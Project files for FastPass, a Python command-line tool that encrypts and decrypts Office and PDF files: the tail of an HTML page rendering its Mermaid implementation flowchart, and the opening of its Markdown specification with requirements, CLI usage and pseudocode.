    E1e["E1e: Build Results Summary\nprocessing_summary = {\n  'total': total_files, 'successful': len(successful_files), ...}"] --> E2a
    
    %% ENHANCED CLEANUP WITH RETRY AND SECURE DELETION
    E2a["E2a: Start Enhanced Cleanup Process\nUse TempFileManager.cleanup_all()\nRetry logic with exponential backoff"] --> E2b
    
    E2b["E2b: Secure Temp Directory Cleanup\nOverwrite sensitive files with zeros\nMultiple cleanup attempts with retry logic"] --> E2bCheck
    
    E2bCheck{"E2b_Check: Enhanced Cleanup Successful?\nSecure deletion and retry cleanup completed\nAll temporary resources removed"}
    E2bCheck -->|"Cleanup failed after retries"| E2bError["E2b_Error: Cleanup Failed After Retries\nLog sanitized warning about cleanup failure\nDon't fail operation due to cleanup issues"]
    E2bCheck -->|"Cleanup successful"| E2c
    
    E2bError --> E2c
    
    E2c["E2c: Remove Individual Temp Files\nfor temp_file in self.temp_files_created:\n  try: temp_file.unlink()"] --> E2cLoop
    
    E2cLoop["E2c_Loop: Cleanup Individual Files\nfor temp_file_path in temp_files_created:\n  attempt to remove each tracked file"] --> E2cCheck
    
    E2cCheck{"E2c_Check: File Removal Successful?\ntemp_file.unlink() completed without error\nFile successfully deleted"}
    E2cCheck -->|"Removal failed"| E2cError["E2c_Error: File Removal Failed\nlogger.warning(f'Failed to remove: {temp_file_path}')\nContinue with remaining files"]
    E2cCheck -->|"Removal successful"| E2cNext
    
    E2cError --> E2cNext
    E2cNext{"E2c_Next: More Temp Files?\nContinue removing remaining tracked files\nClean up all temporary artifacts"}
    E2cNext -->|"More files"| E2cLoop
    E2cNext -->|"All files processed"| E2d
    
    E2d["E2d: Call Handler Cleanup\nfor handler in crypto_handlers.values():\n  handler.cleanup()"] --> E2e
    
    E2e["E2e: Verify Cleanup Completion\ncheck that all temp directories removed\nlog cleanup results"] --> E2f
    
    E2f["E2f: Calculate Disk Space Freed\nspace_freed = sum(temp_file_sizes)\nlogger.info(f'Cleanup freed {space_freed} bytes')"] --> E3a
    
    %% ENHANCED SENSITIVE DATA CLEARING WITH SANITIZATION
    E3a["E3a: Sanitize Error Messages\nApply sanitize_error_message() to all errors\nRemove paths, passwords, sensitive patterns"] --> E3aSanitize
    
    E3aSanitize["E3a_Sanitize: Pattern-Based Sanitization\nRemove password=<value>, IP addresses, email addresses\nReplace absolute paths with <path>/filename"] --> E3aLoop
    
    E3aLoop["E3a_Loop: Overwrite Password Memory\nfor password in all_password_references:\n  attempt to overwrite memory"] --> E3aCheck
    
    E3aCheck{"E3a_Check: Password Variable Found?\nLocate all variables containing passwords\nInclude CLI args, loaded lists, working passwords"}
    E3aCheck -->|"Password variable found"| E3aOverwrite["E3a_Overwrite: Overwrite Password\npassword_var = 'X' * len(password_var)\ndel password_var"]
    E3aCheck -->|"No more password vars"| E3b
    
    E3aOverwrite --> E3aNext
    E3aNext{"E3a_Next: More Password Variables?\nContinue clearing all password references\nEnsure no passwords remain in memory"}
    E3aNext -->|"More variables"| E3aLoop
    E3aNext -->|"All cleared"| E3b
    
    E3b["E3b: Delete Password Manager\ndel self.password_manager\ndel args.cli_passwords"] --> E3c
    
    E3c["E3c: Force Garbage Collection\nimport gc; gc.collect()\nForce Python garbage collection"] --> E3d
    
    E3d["E3d: Clear CLI Argument References\ndel args # if contains passwords\nClear any remaining password references"] --> E4a
    
    %% ENHANCED REPORT GENERATION WITH MULTIPLE FORMATS
    E4a["E4a: Generate Multi-Format Report\nSupport text, JSON, CSV report formats\nInclude sanitized error messages only"] --> E4aCheck
    
    E4aCheck{"E4a_Check: Report Format Selection\nargs.report_format determines output format\nGenerate appropriate structured report"}
    E4aCheck -->|"Text format"| E4aText["E4a_Text: Generate Human-Readable Report\nTraditional console output with visual indicators\nInclude troubleshooting guidance for failures"]
    E4aCheck -->|"JSON format"| E4aJSON["E4a_JSON: Generate Machine-Readable Report\nStructured JSON with timestamps and metrics\nInclude success rate and performance data"]
    E4aCheck -->|"CSV format"| E4aCSV["E4a_CSV: Generate CSV Report\nTabular format for spreadsheet analysis\nPer-file status with sanitized error messages"]
    
    E4aText --> E4b
    E4aJSON --> E4b
    E4aCSV --> E4b
    
    E4b["E4b: List Successful Files\nif successful_files:\n  for result in successful_files: print(f'SUCCESS: {result.path}')"] --> E4c
    
    E4c["E4c: List Failed Files\nif failed_files:\n  for error in failed_files: print(f'FAILED: {error.path}: {error.message}')"] --> E4d
    
    E4d["E4d: Add Performance Metrics\nprint(f'Total processing time: {duration}')\nprint(f'Average processing speed: {files_per_second} files/sec')"] --> E4e
    
    E4e["E4e: Add Troubleshooting Guidance\nif failed_files:\n  print('Troubleshooting suggestions:')"] --> E5a
    
    %% EXIT CODE DETERMINATION
    E5a["E5a: Analyze Results for Exit Code\nsuccess_count = len(successful_files)\nfailure_count = len(failed_files)"] --> E5b
    
    E5b["E5b: Apply Exit Code Logic\nif failure_count == 0 and success_count > 0:\n  exit_code = 0"] --> E5bCheck
    
    E5bCheck{"E5b_Check: Exit Code Determination\nBased on success/failure counts\nand error types encountered"}
    E5bCheck -->|"Perfect success"| E5bSuccess["E5b_Success: Exit Code 0\nexit_code = 0\nexit_reason = 'All operations successful'"]
    E5bCheck -->|"Mixed results"| E5bMixed["E5b_Mixed: Exit Code 1\nexit_code = 1\nexit_reason = 'Some operations failed'"]
    E5bCheck -->|"Complete failure"| E5bFailure["E5b_Failure: Exit Code 1\nexit_code = 1\nexit_reason = 'All operations failed'"]
    
    E5bSuccess --> E5c
    E5bMixed --> E5c
    E5bFailure --> E5c
    
    E5c["E5c: Log Final Status\nlogger.info(f'FastPass completed: {exit_reason}')\nlogger.info(f'Exit code: {exit_code}')"] --> E5d
    
    E5d["E5d: System Exit\nsys.exit(exit_code)\nTerminate program with appropriate code"] --> ProgramEnd
    
    %% ERROR HANDLING PATHS
    ErrorHandling["Error Handling: Exception Caught\nlogger.error(f'Unhandled exception: {e}')\nPerform emergency cleanup"] --> EmergencyCleanup
    
    EmergencyCleanup["Emergency Cleanup: Restore State\nif temp_dir.exists(): shutil.rmtree(temp_dir)\nClear sensitive data, exit with error"] --> ErrorExit
    
    ErrorExit["Error Exit: sys.exit(1)\nAbnormal termination\nReturn error code to shell"] --> ProgramEnd
    
    %% FINAL TERMINATION
    ProgramEnd(["Program Termination\nProcess ends, return to shell\nExit code indicates success/failure"])
    
    %% EXIT POINTS FROM VARIOUS ERROR CONDITIONS
    A1hError --> ProgramEnd
    A1hHelp --> ProgramEnd
    A1iList --> ProgramEnd
    A2aError --> ProgramEnd
    A2a1Error --> ProgramEnd
    A2aBothError --> ProgramEnd
    A2bPathError --> ProgramEnd
    A2cDirError --> ProgramEnd
    A2cAccessError --> ProgramEnd
    A2dTypeError --> ProgramEnd
    A2dCreateError --> ProgramEnd
    A4bError --> ProgramEnd
    A4bTimeout --> ProgramEnd
    A4cError --> ProgramEnd
    A4eError --> ProgramEnd
    B1eError --> ProgramEnd
    B1fMissing --> ProgramEnd
    B1fType --> ProgramEnd
    B2bDanger --> ProgramEnd
    B2cInvalid --> ProgramEnd
    B2eSecurity --> ProgramEnd
    B3dUnsupported --> ProgramEnd
    B3eMismatch --> ProgramEnd
    B4aRead --> ProgramEnd
    B4bLarge --> ProgramEnd
    B4bEmpty --> ProgramEnd
    B4cWrite --> ProgramEnd
    B4dOutput --> ProgramEnd
    B5bFailed --> ProgramEnd
    B6hNoFiles --> ProgramEnd
    C3dLoadError --> ProgramEnd
    D2dNoPassword --> ProgramEnd
    D2fError --> ProgramEnd
    D2hError --> ProgramEnd
    D3aError --> ProgramEnd
    D3bSize --> ProgramEnd
    D3dStatus --> ProgramEnd
    D4cError --> ProgramEnd
    
    %% STYLING
    classDef startBox fill:#e8f4fd,stroke:#1976d2,stroke-width:3px
    classDef processBox fill:#e8f5e8,stroke:#4caf50,stroke-width:2px
    classDef businessLogic fill:#fff8e1,stroke:#f57c00,stroke-width:3px
    classDef decisionBox fill:#fff3e0,stroke:#ff9800,stroke-width:2px
    classDef exitBox fill:#ffebee,stroke:#f44336,stroke-width:2px
    classDef successBox fill:#e3f2fd,stroke:#2196f3,stroke-width:2px
    classDef securityBox fill:#fce4ec,stroke:#e91e63,stroke-width:2px
    classDef errorBox fill:#ffcdd2,stroke:#d32f2f,stroke-width:2px
    
    %% APPLY STYLES - BUSINESS LOGIC (Orange)
    class C3a,C3b,C3c,C3d,C3dLoad,C4a,C4b,C4c,C4d,C4dLoop,C4dAdd,C4e,C5a,C5b,C5c,C5d,C5dSuccess businessLogic
    class D1a,D1b,D1c,D1d,D1e,D1f,D2d,D2e,D2f,D2g,D2gEncrypt,D2gDecrypt,D2h businessLogic
    class D3c,D3cOffice,D3cPDF,D3d businessLogic
    class E3a,E3aSanitize,E3aLoop,E3aOverwrite,E3b,E3c,E3d businessLogic
    
    %% APPLY STYLES - SECURITY (Pink)
    class B2a,B2b,B2bCheck,B2bDanger,B2c,B2cLoop,B2cCheck,B2cInvalid,B2d,B2e,B2eCheck,B2eSecurity securityBox
    class B3bSuccess,B3bFallback securityBox
    class E3a,E3aSanitize,E3aLoop,E3aOverwrite,E3b,E3c,E3d securityBox
    
    %% APPLY STYLES - STANDARD PROCESSING (Green)
    class Start,Main,A1a,A1b,A1c,A1d,A1e,A1f,A1g,A1h,A1i,A2a,A2a1,A2b,A2bLoop,A2bExpand,A2c,A2d,A2e processBox
    class A3a,A3b,A3c,A3d,A3e,A3f,A4a,A4b,A4bSuccess,A4c,A4cSuccess,A4d,A4dLoop,A4e processBox
    class A5a,A5b,A5c,A5d,A5e,A5f,A5g processBox
    class B1a,B1b,B1c,B1cFiles,B1cRecursive,B1d,B1e,B1f,B3a,B3b,B3c,B3d,B3e processBox
    class B4a,B4b,B4c,B4d,B5a,B5aOffice,B5aPDF,B5b,B5c,B6a,B6b,B6c,B6d,B6e,B6f,B6g,B6h processBox
    class C1a,C1b,C1c,C1cOffice,C1d,C1dPDF,C2a,C2aConfig,C2b,C2bConfig processBox
    class D2a,D2b,D2c,D4a,D4aOutput,D4aInPlace,D4b,D4bConflict,D4c,D4d,D4e,D4f,D4g processBox
    class E1a,E1b,E1c,E1d,E1e,E2a,E2b,E2c,E2cLoop,E2d,E2e,E2f processBox
    class E4a,E4aText,E4aJSON,E4aCSV,E4b,E4c,E4d,E4e,E5a,E5b,E5bSuccess,E5bMixed,E5bFailure,E5c,E5d processBox
    
    %% APPLY STYLES - DECISION POINTS (Orange)
    class A1hCheck,A1iCheck,A2aCheck,A2a1Check,A2bCheck,A2bNext,A2cCheck,A2dCheck decisionBox
    class A4bCheck,A4cCheck,A4dCheck,A4dNext,A4eCheck decisionBox
    class B1eCheck,B1fCheck,B2bCheck,B2cCheck,B2cNext,B2eCheck,B3bCheck,B3dCheck,B3eCheck decisionBox
    class B4aCheck,B4bCheck,B4cCheck,B4dCheck,B5aCheck,B5bCheck,B6gCheck,B6hCheck decisionBox
    class C1cCheck,C1dCheck,C2aCheck,C2bCheck,C3dCheck,C3dLoadCheck decisionBox
    class C4dCheck,C4dNext,C5dCheck,C5dNext decisionBox
    class D2dCheck,D2fCheck,D2gCheck,D2hCheck,D2zNext decisionBox
    class D3aCheck,D3bCheck,D3cCheck,D3dCheck,D4aCheck,D4bCheck,D4cCheck decisionBox
    class E2bCheck,E2cCheck,E2cNext,E3aCheck,E3aNext,E4aCheck,E5bCheck decisionBox
    
    %% ERROR PATH LINK STYLING (Red edges leading to errors)
    %% Note: In Mermaid, edge styling should be done after all nodes and connections are defined
    %% This approach uses CSS classes to style error edges consistently
    
    %% APPLY STYLES - ERROR CONDITIONS (Red)
    class A1hError,A2aError,A2aBothError,A2a1Error,A2bPathError,A2cDirError,A2cAccessError errorBox
    class A2dTypeError,A2dCreateError,A4bError,A4bTimeout,A4cError,A4eError errorBox
    class B1eError,B1fMissing,B1fType,B2bDanger,B2cInvalid,B2eSecurity errorBox
    class B3dUnsupported,B3eMismatch,B4aRead,B4bLarge,B4bEmpty,B4cWrite,B4dOutput errorBox
    class B5bFailed,B6hNoFiles,C3dLoadError,C5dFailed errorBox
    class D2dNoPassword,D2fError,D2hError,D3aError,D3bSize,D3dStatus,D4cError errorBox
    class E2bError,E2cError,ErrorHandling,EmergencyCleanup,ErrorExit errorBox
    
    %% APPLY STYLES - SUCCESS/EXIT POINTS (Blue)
    class A1hHelp,A1iList,C3dLoadSuccess,C5dSuccess successBox
    class ProgramEnd successBox`;

        // Load the Mermaid content dynamically
        const diagramElement = document.getElementById('diagram');
        diagramElement.textContent = mermaidContent;
        diagramElement.className = 'mermaid';
    </script>

    <script>
        // Override Mermaid's text size limit
        if (window.mermaid && window.mermaid.mermaidAPI) {
            window.mermaid.mermaidAPI.maxTextSize = 900000;
        }
        
        // Add debug logging
        console.log('Mermaid version:', mermaid.version || 'unknown');
        console.log('Mermaid object:', mermaid);
        console.log('Initializing Mermaid with enhanced settings...');
        
        try {
            mermaid.initialize({ 
            startOnLoad: false,  // Changed to false since we're loading dynamically
            theme: 'default',
            flowchart: {
                useMaxWidth: true,
                htmlLabels: false
            },
            securityLevel: 'loose',
            maxTextSize: 900000,  // Increase text size limit to 900KB
            suppressErrorRendering: false,
            logLevel: 'error',
            deterministicIds: true,
            deterministicIDSeed: 'fastpass-flowchart',
            // Additional config to handle large diagrams
            wrap: true,
            fontSize: 14,
            fontFamily: 'Arial, sans-serif',
            curve: 'basis'
        });
        
        console.log('Mermaid initialization completed');
        
        // Manually render the dynamically loaded content
        setTimeout(() => {
            try {
                mermaid.init(undefined, document.getElementById('diagram'));
                console.log('Dynamic Mermaid rendering completed');
                
                // Apply red styling to error paths
                setTimeout(() => {
                    styleErrorPaths();
                }, 200);
            } catch (renderError) {
                console.error('Dynamic rendering failed:', renderError);
                mermaid.parseError(renderError);
            }
        }, 100);
        
        } catch (initError) {
            console.error('Mermaid initialization failed:', initError);
            document.getElementById('diagram').innerHTML = `
                <div style="padding: 20px; border: 2px solid #f44336; background: #ffebee; border-radius: 4px;">
                    <h3 style="color: #d32f2f; margin-top: 0;">Mermaid Initialization Error</h3>
                    <p>Failed to initialize Mermaid library.</p>
                    <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px;">${initError.message || initError.toString()}</pre>
                </div>
            `;
        }
        
        // Enhanced error handling with proper error stringification
        mermaid.parseError = function(err, hash) {
            console.error('Mermaid parse error:', err);
            console.error('Error details:', err.toString());
            console.error('Error message:', err.message);
            console.error('Error stack:', err.stack);
            
            // Properly stringify the error
            let errorDetails = '';
            if (err.message) {
                errorDetails = err.message;
            } else if (err.toString && err.toString() !== '[object Object]') {
                errorDetails = err.toString();
            } else {
                errorDetails = JSON.stringify(err, Object.getOwnPropertyNames(err), 2);
            }
            
            const diagramDiv = document.getElementById('diagram');
            diagramDiv.innerHTML = `
                <div style="padding: 20px; border: 2px solid #f44336; background: #ffebee; border-radius: 4px; margin: 20px 0;">
                    <h3 style="color: #d32f2f; margin-top: 0;">WARNING: Mermaid Rendering Error</h3>
                    <p>The flowchart encountered a rendering issue.</p>
                    <p><strong>Error Message:</strong></p>
                    <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap;">${errorDetails}</pre>
                    <p><strong>Workarounds:</strong></p>
                    <ul>
                        <li>Check browser console (F12) for detailed error messages</li>
                        <li>Try the 'Force Render' button with different settings</li>
                        <li>Click 'Load Pre-rendered SVG' for guaranteed display</li>
                        <li>View the source code directly in the HTML file</li>
                    </ul>
                    <p><em>Note: The diagram was successfully validated with mmdc CLI, so the content is correct.</em></p>
                </div>
            `;
        };
        
        // Add general error catching
        window.addEventListener('error', function(e) {
            if (e.message && e.message.includes('mermaid')) {
                console.error('Window error related to Mermaid:', e);
            }
        });
        
        // Function to style error paths with red edges
        function styleErrorPaths() {
            const errorNodes = [
                'A1hError', 'A2aError', 'A2aBothError', 'A2bPathError', 'A2cDirError', 'A2cAccessError',
                'A2dTypeError', 'A2dCreateError', 'A4bError', 'A4bTimeout', 'A4cError', 'A4eError',
                'B1eError', 'B1fMissing', 'B1fType', 'B2bDanger', 'B2cInvalid', 'B2eSecurity',
                'B3dUnsupported', 'B3eMismatch', 'B4aRead', 'B4bLarge', 'B4bEmpty', 'B4cWrite', 'B4dOutput',
                'B5bFailed', 'B6hNoFiles', 'C3dLoadError', 'C5dFailed',
                'D2dNoPassword', 'D2fError', 'D2hError', 'D3aError', 'D3bSize', 'D3dStatus', 'D4cError',
                'E2bError', 'E2cError', 'ErrorHandling', 'EmergencyCleanup', 'ErrorExit'
            ];
            
            try {
                const svg = document.querySelector('#diagram svg');
                if (!svg) return;
                
                // Find all edges (paths) in the SVG
                const edges = svg.querySelectorAll('.edgePath');
                
                edges.forEach(edge => {
                    const edgeId = edge.id || '';
                    // Check if this edge leads to an error node
                    errorNodes.forEach(errorNode => {
                        if (edgeId.includes(errorNode) || edge.classList.contains(errorNode)) {
                            const path = edge.querySelector('path');
                            if (path) {
                                path.style.stroke = '#d32f2f';
                                path.style.strokeWidth = '3px';
                            }
                        }
                    });
                });
                
                console.log('Error path styling applied');
            } catch (e) {
                console.warn('Could not apply error path styling:', e);
            }
        }

        let currentZoom = 1;
        const diagram = document.getElementById('diagram');

        function zoomIn() {
            currentZoom += 0.1;
            diagram.style.transform = `scale(${currentZoom})`;
            diagram.style.transformOrigin = 'top left';
        }

        function zoomOut() {
            currentZoom = Math.max(0.2, currentZoom - 0.1);
            diagram.style.transform = `scale(${currentZoom})`;
            diagram.style.transformOrigin = 'top left';
        }

        function resetZoom() {
            currentZoom = 1;
            diagram.style.transform = 'scale(1)';
        }

        function downloadSVG() {
            const svg = document.querySelector('#diagram svg');
            if (svg) {
                const serializer = new XMLSerializer();
                const svgString = serializer.serializeToString(svg);
                const blob = new Blob([svgString], {type: 'image/svg+xml'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'fastpass-complete-implementation-flowchart.svg';
                a.click();
                URL.revokeObjectURL(url);
            } else {
                // If SVG not available, download the raw mermaid code
                const mermaidCode = document.querySelector('.mermaid').textContent;
                const blob = new Blob([mermaidCode], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'fastpass-flowchart-source.txt';
                a.click();
                URL.revokeObjectURL(url);
                alert('SVG not available. Downloaded raw Mermaid source code instead.');
            }
        }

        function printChart() {
            window.print();
        }

        function forceRender() {
            // Try to force render with even higher limits
            const diagram = document.getElementById('diagram');
            
            console.log('Force rendering with maximum settings...');
            
            // Clear and try again with maximum settings
            mermaid.initialize({
                startOnLoad: false,
                theme: 'default',
                flowchart: {
                    useMaxWidth: true,
                    htmlLabels: false
                },
                securityLevel: 'loose',
                maxTextSize: 9999999,  // Very high limit
                suppressErrorRendering: false,  // Show errors for debugging
                logLevel: 'debug'  // More verbose logging
            });
            
            // Re-render
            const originalContent = diagram.innerHTML;
            diagram.innerHTML = originalContent;
            
            try {
                mermaid.init(undefined, diagram);
                console.log('Force render completed');
            } catch (e) {
                console.error('Force render failed:', e);
            }
        }
        
        
        diagram.addEventListener('wheel', function(e) {
            if (e.ctrlKey) {
                e.preventDefault();
                if (e.deltaY < 0) {
                    zoomIn();
                } else {
                    zoomOut();
                }
            }
        });
    </script>
</body>
</html>
</file>

<file path="dev/fast_pass_specification.md">
# FastPass - Complete Project Specification

> **Document Purpose & Maintenance Protocol:**
> This document serves as the authoritative, self-documenting specification for FastPass.
> It provides complete context to future AI instances and developers about:
>
> - **Current project status** and implementation details
> - **Architecture decisions** and technical solutions  
> - **Lessons learned** from development challenges
> - **Usage patterns** and deployment instructions
> - **Complete change history** and evolution of the project
>
> **Maintenance Requirement:** This document MUST be updated whenever significant changes are made to the codebase, architecture, or functionality. It should always reflect the current state of the project and serve as the single source of truth for understanding the entire system.

## Project Mission & Purpose

**FastPass** is a command-line tool that provides universal file encryption and decryption capabilities across multiple file formats. It serves as a unified front-end wrapper for specialized crypto tools (msoffcrypto-tool, PyPDF2) to add or remove password protection from Microsoft Office documents and PDF files.

**Core Problem Solved:** Eliminates the need to learn and manage multiple separate tools for file encryption/decryption across different formats. Provides a consistent, secure interface for password protection operations while maintaining file integrity and implementing enterprise-grade security practices.

**Key Differentiator:** Unified CLI interface with enterprise security patterns including file isolation, in-memory validation, password list support, and secure password handling. Follows proven architecture patterns with "it just works" simplicity for reliability and security.

---

## Product Requirements Document (PRD)

### Project Overview

- **Project Name:** FastPass
- **Version:** v1.0
- **Target Platform:** Windows Desktop (CLI) with cross-platform Python support
- **Technology Stack:** Python, msoffcrypto-tool, PyPDF2, filetype library, pathlib
- **Timeline:** Development in progress
- **Team Size:** Single developer maintained

### Target Users

- **Primary Users:** IT administrators, security professionals, business users
- **Secondary Users:** Developers, system integrators, automation script writers
- **User Experience Level:** Intermediate (comfortable with command-line tools)
- **Use Cases:** Batch file encryption, automated security workflows, document protection

### Feature Specifications

#### Core Functionality
- [x] Universal file encryption/decryption interface
- [x] Microsoft Office document password protection (modern and legacy formats)
- [x] PDF password protection and removal  
- [x] Batch processing for multiple files
- [x] Recursive directory processing with in-place or copy modes
- [x] Automatic file format detection using filetype library
- [x] Direct import strategy for simplified code management

#### Security & File Safety
- [x] File format validation using filetype library (simplified magic number checking)
- [x] Path traversal attack prevention with whitelist approach
- [x] Secure temporary file creation with proper permissions (0o600)
- [x] Password memory clearing and secure handling
- [x] Error message sanitization to prevent information disclosure
- [x] Legacy Office format protection (decrypt-only limitation documented)

#### Password Management
- [x] Per-file password specification with automatic pairing
- [x] Password management with multiple password support
- [x] Password list file support for batch operations
- [x] JSON password input via stdin for GUI integration
- [x] Secure password handling and memory cleanup
- [x] Password validation before file processing

#### File Operations
- [x] In-place modification with validation-based safety
- [x] Output directory specification for batch operations
- [x] File integrity verification after operations
- [x] Duplicate filename handling and conflict resolution
- [x] Comprehensive cleanup of temporary files

#### Utility Features
- [x] Dry-run mode for testing operations
- [x] File format support detection
- [x] Password requirement checking
- [x] Batch operation progress reporting
- [x] Detailed logging with debug mode

### Success Metrics

- **Performance Targets:** File processing < 10 seconds for typical business documents
- **User Experience:** Zero data loss through validation, "it just works" simplicity, clear error messages
- **Reliability:** 99.9% successful completion rate for valid inputs
- **Security:** No password exposure in logs, secure temporary file handling

### Constraints & Assumptions

- **Technical Constraints:** Requires underlying crypto libraries (msoffcrypto-tool, PyPDF2) to be available
- **Platform Constraints:** Cross-platform compatible with pure Python dependencies
- **Security Constraints:** Must maintain file confidentiality and integrity throughout operations
- **User Constraints:** Must have appropriate file permissions for input and output directories
- **Assumptions:** Users understand file encryption concepts and password management practices

---

## Project Directory Structure

```
fast_pass/
├── src/                          # Main source code
│   ├── __init__.py
│   ├── __main__.py               # Makes package executable with 'python -m src'
│   ├── cli.py                    # CLI argument parsing and validation
│   ├── core/                     # Core business logic
│   │   ├── __init__.py
│   │   ├── file_handler.py       # File processing pipeline
│   │   ├── security.py           # Security validation and path checking
│   │   ├── crypto_handlers/      # Crypto tool integrations
│   │   │   ├── __init__.py
│   │   │   ├── office_handler.py # msoffcrypto-tool integration
│   │   │   └── pdf_handler.py    # PyPDF2 integration
│   │   └── password/             # Password handling modules
│   │       ├── __init__.py
│   │       ├── password_manager.py # Password validation and management
│   │       └── password_list.py    # Password list file handling
│   └── utils/                    # Utility modules
│       ├── __init__.py
│       ├── logger.py             # Logging configuration
│       └── config.py             # Configuration management
├── tests/                        # Test suite
│   ├── __init__.py
│   ├── test_cli.py
│   ├── test_core.py
│   ├── test_crypto_handlers.py
│   ├── test_security.py
│   ├── test_password_handling.py
│   └── test_integration.py
├── dev/                          # Development documentation
│   └── fast_pass_specification.md
├── requirements.txt              # Python dependencies
├── requirements-dev.txt          # Development dependencies
├── setup.py                      # Package setup
└── README.md                     # User documentation
```

### **Python Dependencies**

**Requirements (requirements.txt):**
```
msoffcrypto-tool>=5.0.0    # Office document encryption/decryption
PyPDF2>=3.0.0              # PDF processing and encryption
filetype>=1.2.0            # File type detection (replaces python-magic)
```

**PyInstaller Integration Notes:**
- All Python packages will be bundled into executable
- No external binaries required - pure Python dependencies
- Direct imports for simplified code management

### **Password Handling Architecture**

**Simplified password management without reuse concept:**

```python
# Password handling with multiple sources and priority algorithm
class PasswordManager:
    def __init__(self):
        self.cli_passwords = []  # Space-delimited passwords from CLI
        self.password_list_file = None  # Path to password list file
        self.password_list = []  # Passwords loaded from file
        
    def load_password_sources(self, args):
        """Load passwords from all sources"""
        # Space-delimited passwords from CLI
        if hasattr(args, 'cli_passwords') and args.cli_passwords:
            self.cli_passwords = [p for p in args.cli_passwords if p != 'stdin']
            
        # Password list file
        if args.password_list:
            self.password_list_file = args.password_list
            self.password_list = self._load_password_list()
            
    def get_password_candidates(self, file_path):
        """Get prioritized list of passwords to try for a file"""
        candidates = []
        
        # Priority 1: CLI -p passwords (in order provided)
        candidates.extend(self.cli_passwords)
        
        # Priority 2: Password list file (line by line)
        candidates.extend(self.password_list)
            
        # Remove duplicates while preserving order
        return list(dict.fromkeys(candidates))
        
    def _load_password_list(self):
        """Load passwords from text file, one per line"""
        try:
            with open(self.password_list_file, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log_error(f"Password list file not found: {self.password_list_file}")
            return []
            
    def find_working_password(self, file_path, crypto_handler):
        """Find working password for file by trying all candidates"""
        candidates = self.get_password_candidates(file_path)
        
        for password in candidates:
            if crypto_handler.test_password(file_path, password):
                return password
        
        return None
```

---

## Command Line Reference

```
Usage: fast_pass {encrypt|decrypt} [options]

Required Arguments:
  encrypt                  Add password protection to files
  decrypt                  Remove password protection from files

File Input Options:
  -i, --input FILE...      Files to process (space-delimited, quotes for spaces)
  -r, --recursive DIR      Process directory recursively (decrypt/check-password only)

Password Options:
  -p, --password PASS...   Passwords to try (space-delimited, quotes for spaces)
  --password-list FILE     Text file with passwords to try (one per line)
  -p stdin                 Read passwords from JSON via stdin (GUI integration)
  --check-password [FILE]  Check if file requires password (dry-run mode)

Output Options:
  -o, --output-dir DIR     Output directory (default: in-place modification)

Utility Options:
  --dry-run               Show what would be done without making changes
  --verify                Deep verification of processed files
  --list-supported        List supported file formats
  --debug                 Enable detailed logging and debug output
  -h, --help              Show this help message
  -v, --version           Show version information

Supported File Formats:
  Modern Office:     .docx, .xlsx, .pptx, .docm, .xlsm, .pptm, .dotx, .xltx, .potx
                     (Encryption: experimental support, Decryption: full support)
  Legacy Office:     .doc, .xls, .ppt (NOT SUPPORTED - use Office to convert to modern format)
  PDF Files:         .pdf (Full encryption and decryption support)
Examples:
  # Encrypt single file with password
  fast_pass encrypt -i contract.docx -p "mypassword"
  
  # Decrypt multiple files with same password
  fast_pass decrypt -i file1.pdf file2.docx file3.xlsx -p "shared_pwd"
  
  # Multiple passwords via CLI (space-delimited, tries all passwords on all files)
  fast_pass decrypt -i file1.pdf file2.docx -p "password123" "secret456" "admin789"
  
  # Passwords with spaces (quoted)
  fast_pass decrypt -i protected.pdf -p "password1" "password 2" "ps3"
  
  # Password list file for batch operations
  fast_pass decrypt -i "archive_folder/report1.pdf" "archive_folder/report2.pdf" --password-list common_passwords.txt
  
  # Combined approach: specific password + password list fallback
  fast_pass decrypt -i urgent.pdf "archive1.pdf" "archive2.pdf" -p "urgent_pwd" --password-list common_passwords.txt
  
  # Passwords from stdin JSON (GUI integration)
  fast_pass decrypt -i file1.pdf file2.docx -p stdin < passwords.json
  # JSON format: {"file1.pdf": "secret1", "file2.docx": "secret2"}
  
  # Recursively process directory (decrypt only)
  fast_pass decrypt -r ./encrypted_docs/ -p "main_password"
  
  # Recursive with password list
  fast_pass decrypt -r ./archive/ --password-list passwords.txt
  
  # Check password protection status (dry-run)
  fast_pass --check-password -r ./documents/ --password-list test_passwords.txt
  
  # Mixed file types with output directory
  fast_pass encrypt -i report.pdf data.xlsx presentation.pptx -p "secret" -o ./secured/
  
  # Security: Use custom allowed directories
  fast_pass decrypt -i ./restricted/report.pdf --allowed-dirs /home/user/restricted /tmp -p "password123"

Exit Codes:
  0  Success
  1  General error (file access, crypto tool failure)
  2  Invalid arguments or command syntax
  3  Security violation (path traversal, invalid format)
  4  Password error (wrong password, authentication failure)
```

---

## High-Level Architecture Overview - Core Processing Flow

> 💡 **IMPLEMENTATION CRITICAL**: This pseudocode provides the master reference for code organization. Every code block must map to a specific element ID (e.g., `# A1a`, `# B3c`, etc.)

```python
# MAIN PROGRAM ENTRY POINT
def main():
    """FastPass main entry point with complete error handling"""
    try:
        # A: CLI Parsing & Initialization
        args = parse_command_line_arguments()
        if args.help or args.version or args.list_supported:
            display_information_and_exit(args)  # Exit code 0
        
        # B: Security & File Validation  
        validated_files = perform_security_and_file_validation(args)
        
        # C: Crypto Tool Selection & Configuration
        crypto_handlers = setup_crypto_tools_and_configuration(validated_files)
        
        # D: File Processing & Operations
        processing_results = process_files_with_crypto_operations(
            validated_files, crypto_handlers, args
        )
        
        # E: Cleanup & Results Reporting
        exit_code = cleanup_and_generate_final_report(processing_results)
        sys.exit(exit_code)
        
    except SecurityViolationError as e:
        log_sanitized_error(e)
        sys.exit(3)  # Security violation
    except FileFormatError as e:
        log_error(f"File format error: {e}")
        sys.exit(1)  # Format/access error
    except CryptoToolError as e:
        log_error(f"Crypto tool unavailable: {e}")
        sys.exit(1)  # Tool availability error
    except ProcessingError as e:
        cleanup_partial_processing_on_failure()
        sys.exit(1)  # Processing failure
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        sys.exit(2)  # General error

# CONFIGURATION MANAGEMENT SYSTEM
class FastPassConfig:
    """Configuration management with multiple sources and precedence"""
    VERSION = "1.0.0"
    MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
    TEMP_DIR_PREFIX = "fastpass_"
